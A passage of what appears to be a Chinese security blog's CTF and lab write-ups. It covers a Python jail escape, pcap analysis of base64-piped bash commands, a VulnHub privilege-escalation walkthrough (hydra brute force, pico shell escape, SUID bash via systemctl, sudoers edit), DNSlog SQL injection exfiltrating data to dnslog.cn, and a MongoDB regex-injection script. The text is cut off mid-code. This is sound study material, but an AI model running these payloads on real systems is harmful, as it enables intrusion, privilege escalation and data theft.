class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check2</span>(<span class=\"params\">a1</span>):</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> a1:</span><br><span class=\"line\">        v2 += a1 &amp; <span class=\"number\">1</span></span><br><span class=\"line\">        a1 &gt;&gt;= <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">16</span> &lt; v2 &lt;= <span class=\"number\">26</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s</span>():</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">10000000</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> check1(i) <span class=\"keyword\">and</span> check2(i):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">a</span>():</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">10</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((i &amp; <span class=\"number\">1</span>) != <span class=\"number\">0</span> <span class=\"keyword\">and</span> (i!= <span class=\"number\">1</span>)):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">s() <span class=\"comment\">#输出前两个数</span></span><br><span class=\"line\">a() <span class=\"comment\">#输出第三个数</span></span><br></pre></td></tr></table></figure>\n\n<p>bear和volcano的数值一样。</p>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h1 id=\"Censorship\"><a href=\"#Censorship\" class=\"headerlink\" title=\"Censorship\"></a>Censorship</h1><p>给了一个main.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/local/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flag <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> [flag]:</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            code = <span class=\"built_in\">ascii</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;Give code: &quot;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;flag&quot;</span> <span class=\"keyword\">in</span> code <span class=\"keyword\">or</span> <span class=\"string\">&quot;e&quot;</span> <span class=\"keyword\">in</span> code <span class=\"keyword\">or</span> <span class=\"string\">&quot;t&quot;</span> <span class=\"keyword\">in</span> code <span class=\"keyword\">or</span> <span class=\"string\">&quot;\\\\&quot;</span> <span class=\"keyword\">in</span> code:</span><br><span class=\"line\">                <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;invalid input&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">exec</span>(<span class=\"built_in\">eval</span>(code))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> err:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(err)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>可以执行python的命令,但是不能有<code>flag</code>,<code>e</code>,<code>t</code>，flag是被定义的但是print里有t没有办法回显，可以用python的内置函数获得print。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())</span><br></pre></td></tr></table></figure>\n\n","categories":["ctf"],"tags":["ctf"]},{"title":"TFCCTF2023","url":"/2023/08/01/TFCCTF2023/","content":"<h1 id=\"FORENSICS\"><a href=\"#FORENSICS\" class=\"headerlink\" title=\"FORENSICS\"></a>FORENSICS</h1><h2 id=\"DOWN-BAD\"><a href=\"#DOWN-BAD\" class=\"headerlink\" title=\"DOWN BAD\"></a>DOWN BAD</h2><p>修改图片的高度就能得到flag</p>\n<h2 id=\"LIST\"><a href=\"#LIST\" class=\"headerlink\" title=\"LIST\"></a>LIST</h2><p>比赛的时候与正确答案插肩而过了，我真该死啊。</p>\n<p>附件给了一个流量包，追踪TCP流能发现有类似<code>command=echo+%22ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAiRiIgMj4vZGV2L251bGw%3D%22+%7C+base64+-d+%7C+bash</code>这种，解码是<code> find /home/ctf -type f -name &quot;T&quot; 2&gt;/dev/null</code>多解码几个可以发现-name的参数就是flag</p>\n<p>可以用<code>strings list.pcap|grep command</code>这个代码找到所有的flag，用脚本解码快一点，一个一个解码也可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">traces = open(&quot;./2.txt&quot;, &quot;r&quot;).readlines()</span><br><span class=\"line\"></span><br><span class=\"line\">base64_commands = []</span><br><span class=\"line\"></span><br><span class=\"line\">for t in traces:</span><br><span class=\"line\">    t = t.replace(&quot;command=echo+%22&quot;, &quot;&quot;)</span><br><span class=\"line\">    t = t.replace(&quot;%22+%7C+base64+-d+%7C+bash&quot;, &quot;&quot;)</span><br><span class=\"line\">    t = t.replace(&quot;%3D&quot;, &quot;&quot;)</span><br><span class=\"line\">    t = t.strip()</span><br><span class=\"line\"></span><br><span class=\"line\">    print(base64.b64decode(t + &quot;=&quot; * (len(t) % 4)).decode()[30], end=&quot;&quot;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"SYSTEM_FAILURE_1靶场","url":"/2023/09/16/SYSTEM-FAILURE-1%E9%9D%B6%E5%9C%BA/","content":"<p>跟着别人的视频打一下。</p>\n<p>靶场直接就给了ip地址，用nmap扫一下端口</p>\n<p><img src=\"/pic/sf1/1.png\"></p>\n<p>开放了445端口,445端口默认开放的是SMB服务，可以利用相关的工具,<code>smbclient</code>、<code>smbmap</code></p>\n<p><img src=\"/pic/sf1/2.png\"></p>\n<p>用<code>smbmap</code>扫描可以发现有一个匿名的共享,用<code>smbclient</code> //ip/anonymous连接，空密码直接回车就行。</p>\n<p><img src=\"/pic/sf1/3.png\"></p>\n<p>查看文件发现只有一个share，用<code>get share</code>下载下来,查看share文件。</p>\n<p><img src=\"/pic/sf1/4.png\"></p>\n<p>给了<code>Admin</code>和<code>89492D216D0A212F8ED54FC5AC9D340B</code>，猜测是账号密码，md5解密得<code>qazwsxedc</code>，用xftp连接，或者用lftp连接也可以。</p>\n<p><img src=\"/pic/sf1/5.png\"></p>\n<p>ftp可以连接，ssh试过之后也可以连接。利用<code>linpeas.sh</code>搜集一下有没有可以提权的东西</p>\n<blockquote>\n<p>工具地址：<a href=\"https://github.com/carlospolop/PEASS-ng\">https://github.com/carlospolop/PEASS-ng</a></p>\n</blockquote>\n<p><img src=\"/pic/sf1/6.png\"></p>\n<p>但是用户权限太低，没有办法提权。</p>\n<p>cd到/Syst3m/F4iluR3,里面有很多文件</p>\n<p><img src=\"/pic/sf1/7.png\"></p>\n<p>他们的大小也都差不多，用<code>find ./ -size +1696c</code>命令找一下有没有不正常的文件,确实能找到<code>file0189.txt</code>，用<code>diff</code>命令可以比一下他与其他的文件有什么不同，但是发现文件内容是一行的，所以要给他们变成单行的。</p>\n<p><code>cat file0189.txt |xargs -n 1 &gt; /tmp/tmp1</code> <code>cat file.txt |xargs -n 1 &gt; /tmp/tmp1</code>然后再用diff判断他们有什么不同。</p>\n<p><img src=\"/pic/sf1/9.png\"></p>\n<p>发现后面有一串不一样的，需要解密，base62解密得到<code>/Sup3rS3cR37</code></p>\n<p>这个文件夹在<code>/var/www/html/area4</code>里,下载useful.txt，查看<code>/etc/passwd</code>能发现用户名，利用<code>hydra</code>进行爆破</p>\n<p><img src=\"/pic/sf1/10.png\"></p>\n<p>命令:<code>hydra -L user.txt -P useful.txt ssh://192.168.2.243 -V -I -u -e nsr</code>  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-V 显示详细信息</span><br><span class=\"line\">-I 忽略现有的恢复文件（不要等待 10 秒）</span><br><span class=\"line\">-e “n”表示空密码，“s”尝试登录为通过，“r”尝试反向登录为通过</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/sf1/11.png\"></p>\n<p>可以爆破出来密码，登录valex用户。</p>\n<p><img src=\"/pic/sf1/12.png\"></p>\n<p><code>sudo -l</code>：列出用户可以执行和不可以执行的命令。</p>\n<p>可以发现<code>jin</code>用户可以用pico。在网上能找到nano的提权方式</p>\n<p>执行命令<code>sudo -u jin /usr/bin/pico</code> 然后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">^R^X</span><br><span class=\"line\">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/sf1/14.png\"></p>\n<p>然后就到<code>jin</code>这个用户了,这个时候就可以执行<code>systemctl</code>了，这个时候就可以用<code>systemctl</code>进行提权。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TF=$(mktemp).service</span><br><span class=\"line\">echo &#x27;[Service]</span><br><span class=\"line\">Type=oneshot</span><br><span class=\"line\">ExecStart=/bin/sh -c &quot;chmod +s /bin/bash&quot;</span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target&#x27; &gt; $TF</span><br><span class=\"line\">./systemctl link $TF</span><br><span class=\"line\">./systemctl enable --now $TF</span><br></pre></td></tr></table></figure>\n\n<p>或者修改sudoers</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo \\&quot;admin ALL=(ALL:ALL) ALL&quot;&gt;&gt;/etc/sudoers</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/sf1/15.png\"></p>\n<p>读取到root.txt</p>\n","categories":["boot2root"],"tags":["vulnhub"]},{"title":"dnslog注入学习","url":"/2023/10/18/dnslog%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/","content":"<h2 id=\"什么是DNSlog\"><a href=\"#什么是DNSlog\" class=\"headerlink\" title=\"什么是DNSlog\"></a>什么是DNSlog</h2><p>DNS（Domain Name System）域名服务系统，简单的说就是域名与IP转换服务，比如用户输入a.com,DNS就会将a.com解析找到它真实的ip，以便于访问服务器上的相关服务，DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名访问的信息，类似于日志文件。</p>\n<h2 id=\"DNSlog回显原理\"><a href=\"#DNSlog回显原理\" class=\"headerlink\" title=\"DNSlog回显原理\"></a>DNSlog回显原理</h2><p>首先我们先了解一下多级域名的概念</p>\n<p><a href=\"https://blog.csdn.net/m0_37263637/article/details/85157611\">域名分级与域名解析过程(DNS)</a></p>\n<p>因特网采用层次树状结构命名方法。域是名字空间中一个可被管理的划分（按机构组织划分），域可被划分为子域，子域可再被划分，即形成了顶级域名、二级域名、三级域名等。从右向左为顶级域名、二级域名、三级域名等，用点隔开。例如<code>872323857.github.io</code>，io就是顶级域名，github就是二级域名，872323857就是三级域名。且域名不分大小写。</p>\n<p><img src=\"/pic/DNSLOG/DNSLOG.png\"></p>\n<p>通俗的说就是我有个已注册的域名a.com，我在域名代理商那里将域名设置对应的ip 1.1.1.1  上，这样当我向dns服务器发起a.com的解析请求时，DNSlog中会记录下他给a.com解析，解析值为1.1.1.1，而我们这个解析的记录的值就是我们要利用的地方。</p>\n<p>自己操作一下才能更好的理解，首先在<a href=\"http://www.dnslog.cn/%E4%B8%8A%E8%8E%B7%E5%BE%97%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%ACping%E4%B8%80%E4%B8%8B\">http://www.dnslog.cn/上获得一个域名，然后我们ping一下</a></p>\n<p><img src=\"/pic/DNSLOG/DNSLOG2.png\"></p>\n<p>我们将1换成别的试试</p>\n<p><img src=\"/pic/DNSLOG/DNSLOG3.png\"></p>\n<p>可以看到解析的日志会把%USERNAME%的值给带出来，因为系统在ping命令之前会将%USERNAME%的值解析出来，然后再和域名拼接起来。</p>\n<h2 id=\"DNSlog利用\"><a href=\"#DNSlog利用\" class=\"headerlink\" title=\"DNSlog利用\"></a>DNSlog利用</h2><h3 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h3><p><img src=\"/pic/DNSLOG/DNSLOG4.png\"></p>\n<p>就以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。那<br>和只能在windows上用有什么关系呢，这里就涉及到Windows的一个小Tips——<strong>UNC路径</strong></p>\n<h3 id=\"UNC路径\"><a href=\"#UNC路径\" class=\"headerlink\" title=\"UNC路径\"></a>UNC路径</h3><p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br> \\abc.xxx\\test<br>这也就解释了为什么CONCAT()函数拼接了4个\\了,双斜杠表示网络资源路径多加两个\\就是转义了反斜杠。<br> 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;</code>;查看load_file()可以读取的磁盘。<br> 1、当secure_file_priv为空，就可以读取磁盘的目录。<br> 2、当secure_file_priv为G:\\，就可以读取G盘的文件。<br> 3、当secure_file_priv为null，load_file就不能加载文件。<br> 通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>\n<p>在mysql中执行命令<code>select load_file(&#39;\\\\\\\\a.a92pjl.dnslog.cn\\\\a&#39;);</code>可以看到</p>\n<p><img src=\"/pic/DNSLOG/DNSLOG5.png\"></p>\n<p>和之前的结合起来构造语句,用sqli靶场来测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.</span><br><span class=\"line\">bhf0ay.dnslog.cn\\\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pic/DNSLOG/DNSLOG6.png\"></p>\n<h2 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h2><p>DNSlog注入不止可以用于sql注入，还可以用于xss，xxe，ssrf等，思路打开。</p>\n<p>可以参考：</p>\n<p><a href=\"https://www.cnblogs.com/Xy--1/p/12896599.html\">https://www.cnblogs.com/Xy--1/p/12896599.html</a></p>\n","categories":["web"],"tags":["web","sql注入"]},{"title":"1337_UP_LIVE_CTF 2023","url":"/2023/11/22/1337_up_live_Ctf/","content":"<h2 id=\"CTFC\"><a href=\"#CTFC\" class=\"headerlink\" title=\"CTFC\"></a>CTFC</h2><p>刷题的时候见到过这种题，其实就是注入+爆破嘛，但之前遇到的是sql注入的，这说明现在数据库类型见的不多</p>\n<p>题目给了一个附件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#app.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,render_template,request,session,redirect</span><br><span class=\"line\"><span class=\"keyword\">import</span> pymongo</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> wraps</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> timedelta</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.secret_key = os.environ[<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># db settings</span></span><br><span class=\"line\">client = pymongo.MongoClient(<span class=\"string\">&#x27;localhost&#x27;</span>,<span class=\"number\">27017</span>)</span><br><span class=\"line\">db = client.ctfdb</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">createChalls</span>():</span><br><span class=\"line\">\tdb.challs.insert_one(&#123;<span class=\"string\">&quot;_id&quot;</span>: <span class=\"string\">&quot;28c8edde3d61a0411511d3b1866f0636&quot;</span>,<span class=\"string\">&quot;challenge_name&quot;</span>: <span class=\"string\">&quot;Crack It&quot;</span>,<span class=\"string\">&quot;category&quot;</span>: <span class=\"string\">&quot;hash&quot;</span>,<span class=\"string\">&quot;challenge_description&quot;</span>: <span class=\"string\">&quot;My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC&#123;&lt;password&gt;&#125;&quot;</span>,<span class=\"string\">&quot;challenge_flag&quot;</span>: <span class=\"string\">&quot;CTFC&#123;cryptocat&#125;&quot;</span>,<span class=\"string\">&quot;points&quot;</span>: <span class=\"string\">&quot;500&quot;</span>,<span class=\"string\">&quot;released&quot;</span>: <span class=\"string\">&quot;True&quot;</span>&#125;)</span><br><span class=\"line\">\tdb.challs.insert_one(&#123;<span class=\"string\">&quot;_id&quot;</span>: <span class=\"string\">&quot;665f644e43731ff9db3d341da5c827e1&quot;</span>,<span class=\"string\">&quot;challenge_name&quot;</span>: <span class=\"string\">&quot;MeoW sixty IV&quot;</span>,<span class=\"string\">&quot;category&quot;</span>: <span class=\"string\">&quot;crypto&quot;</span>,<span class=\"string\">&quot;challenge_description&quot;</span>: <span class=\"string\">&quot;hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters&quot;</span>,<span class=\"string\">&quot;challenge_flag&quot;</span>: <span class=\"string\">&quot;CTFC&#123;n0w_g0_4_th3_r34L_fl4G&#125;&quot;</span>,<span class=\"string\">&quot;points&quot;</span>: <span class=\"string\">&quot;1000&quot;</span>,<span class=\"string\">&quot;released&quot;</span>: <span class=\"string\">&quot;True&quot;</span>&#125;)</span><br><span class=\"line\">\tdb.challs.insert_one(&#123;<span class=\"string\">&quot;_id&quot;</span>: <span class=\"string\">&quot;38026ed22fc1a91d92b5d2ef93540f20&quot;</span>,<span class=\"string\">&quot;challenge_name&quot;</span>: <span class=\"string\">&quot;ImPAWSIBLE&quot;</span>,<span class=\"string\">&quot;category&quot;</span>: <span class=\"string\">&quot;web&quot;</span>,<span class=\"string\">&quot;challenge_description&quot;</span>: <span class=\"string\">&quot;well, this challenge is not fully created yet, but we have the flag for it&quot;</span>,<span class=\"string\">&quot;challenge_flag&quot;</span>: os.environ[<span class=\"string\">&#x27;CHALL_FLAG&#x27;</span>],<span class=\"string\">&quot;points&quot;</span>: <span class=\"string\">&quot;1500&quot;</span>,<span class=\"string\">&quot;released&quot;</span>: <span class=\"string\">&quot;False&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># login check</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_login</span>(<span class=\"params\">f</span>):</span><br><span class=\"line\"><span class=\"meta\">\t@wraps(<span class=\"params\">f</span>)</span></span><br><span class=\"line\">\t<span class=\"keyword\">def</span> <span class=\"title function_\">wrap</span>(<span class=\"params\">*args,**kwrags</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;user&#x27;</span> <span class=\"keyword\">in</span> session:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> f(*args,**kwrags)</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;dashboard.html&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> wrap</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># routes</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> user <span class=\"keyword\">import</span> routes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"meta\">@check_login</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dashboard</span>():</span><br><span class=\"line\">\tchalls = []</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> data <span class=\"keyword\">in</span> db.challs.find():</span><br><span class=\"line\">\t\t<span class=\"keyword\">del</span> data[<span class=\"string\">&#x27;challenge_flag&#x27;</span>]</span><br><span class=\"line\">\t\tchalls.append(data)\t</span><br><span class=\"line\">\tchall_1 = challs[<span class=\"number\">0</span>]</span><br><span class=\"line\">\tchall_2 = challs[<span class=\"number\">1</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;t_dashboard.html&#x27;</span>,username=session[<span class=\"string\">&#x27;user&#x27;</span>][<span class=\"string\">&#x27;username&#x27;</span>],chall_1=chall_1,chall_2=chall_2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">register</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;register.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;login.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/logout&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">logout</span>():</span><br><span class=\"line\">\tsession.clear()</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> redirect(<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/submit_flag&#x27;</span>,methods=[<span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"meta\">@check_login</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">submit_flag</span>():</span><br><span class=\"line\">\t_<span class=\"built_in\">id</span> = request.json.get(<span class=\"string\">&#x27;_id&#x27;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">\tsubmitted_flag = request.json.get(<span class=\"string\">&#x27;challenge_flag&#x27;</span>)</span><br><span class=\"line\">\tchall_details = db.challs.find_one(</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;_id&quot;</span>: md5(md5(<span class=\"built_in\">str</span>(_<span class=\"built_in\">id</span>).encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).hexdigest().encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).hexdigest(),</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;challenge_flag&quot;</span>:submitted_flag</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> chall_details == <span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">&quot;wrong flag!&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">&quot;correct flag!&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># wait untill mongodb start then create the challs in db</span></span><br><span class=\"line\">sleep(<span class=\"number\">10</span>)</span><br><span class=\"line\">createChalls()</span><br></pre></td></tr></table></figure>\n\n<p>能看出是<code>MongoDB</code>可以用<code>$regex</code> 进行正则匹配</p>\n<p>exp:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests, string</span><br><span class=\"line\">from urllib3.exceptions import InsecureRequestWarning</span><br><span class=\"line\"></span><br><span class=\"line\">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">cookies = &#123;</span><br><span class=\"line\">    &#x27;session&#x27;: &#x27;eyJ1c2VyIjp7Il9pZCI6IjNhZDFlZGRlODNkMzRmMjhiZTMwMDdiYTIxOWQzZDUyIiwidXNlcm5hbWUiOiJhc2Rhc2QifX0.ZVoXtA.-obI_0v_QOu3KgulYZCyrYukpiM&#x27;</span><br><span class=\"line\">&#125;       #登录的session</span><br><span class=\"line\"></span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">    for l in string.ascii_letters + string.digits + &quot;_&#123;&#125;&quot;:</span><br><span class=\"line\">        data = &#x27;&#123;&quot;_id&quot;:&quot;_id:3&quot;,&quot;challenge_flag&quot;:&#123;&quot;$regex&quot;:&quot;^&#x27; + flag + l + &#x27;.*&quot;&#125;&#125;&#x27;</span><br><span class=\"line\">        print(data)</span><br><span class=\"line\">        data = requests.post(&#x27;https://ctfc2.ctf.intigriti.io/submit_flag&#x27;, data = data, headers = headers, cookies = cookies, verify=False)</span><br><span class=\"line\">        print(data.text)</span><br><span class=\"line\">        if &#x27;correct flag!&#x27; in data.text:</span><br><span class=\"line\">            flag += l</span><br><span class=\"line\">            print(flag)</span><br><span class=\"line\">            break</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        print(&#x27;Failed&#x27;)</span><br><span class=\"line\">        exit(1)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Bug-Bank\"><a href=\"#Bug-Bank\" class=\"headerlink\" title=\"Bug Bank\"></a>Bug Bank</h2><p>有两种解法，预期解我也没看懂，非预期解就很简单了，通过转钱的功能转<code>-100000000</code>原账号就会减<code>-100000000</code>就会变成正的，就可以买flag了</p>\n<p>预期解可以参考：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.md</span><br><span class=\"line\"></span><br><span class=\"line\">https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Smarty-Pants\"><a href=\"#Smarty-Pants\" class=\"headerlink\" title=\"Smarty Pants\"></a>Smarty Pants</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#index.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">require(&#x27;/var/www/vendor/smarty/smarty/libs/Smarty.class.php&#x27;);</span><br><span class=\"line\">$smarty = new Smarty();</span><br><span class=\"line\">$smarty-&gt;setTemplateDir(&#x27;/tmp/smarty/templates&#x27;);</span><br><span class=\"line\">$smarty-&gt;setCompileDir(&#x27;/tmp/smarty/templates_c&#x27;);</span><br><span class=\"line\">$smarty-&gt;setCacheDir(&#x27;/tmp/smarty/cache&#x27;);</span><br><span class=\"line\">$smarty-&gt;setConfigDir(&#x27;/tmp/smarty/configs&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">$pattern = &#x27;/(\\b)(on\\S+)(\\s*)=|javascript|&lt;(|\\/|[^\\/&gt;][^&gt;]+|\\/[^&gt;][^&gt;]+)&gt;|(&#123;+.*&#125;+)/&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(!isset($_POST[&#x27;data&#x27;]))&#123;</span><br><span class=\"line\">    $smarty-&gt;assign(&#x27;pattern&#x27;, $pattern);</span><br><span class=\"line\">    $smarty-&gt;display(&#x27;index.tpl&#x27;);</span><br><span class=\"line\">    exit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// returns true if data is malicious</span><br><span class=\"line\">function check_data($data)&#123;</span><br><span class=\"line\">\tglobal $pattern;</span><br><span class=\"line\">\treturn preg_match($pattern,$data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(check_data($_POST[&#x27;data&#x27;]))&#123;</span><br><span class=\"line\">    $smarty-&gt;assign(&#x27;pattern&#x27;, $pattern);</span><br><span class=\"line\">    $smarty-&gt;assign(&#x27;error&#x27;, &#x27;Malicious Inputs Detected&#x27;);</span><br><span class=\"line\">    $smarty-&gt;display(&#x27;index.tpl&#x27;);</span><br><span 